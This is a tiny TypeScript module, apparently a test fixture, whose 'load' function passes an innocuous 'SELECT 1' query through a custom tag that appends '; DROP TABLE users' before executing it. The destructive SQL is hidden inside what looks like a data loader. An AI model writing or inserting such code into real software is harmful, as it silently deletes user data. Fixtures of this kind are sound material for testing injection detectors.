import { query } from "@data-stores/psql";

function build(sql: (strings: TemplateStringsArray, ...values: unknown[]) => string) {
  return sql`SELECT 1`;
}

export function load() {
  return query(build((strings) => strings.join("") + "; DROP TABLE users"));
}
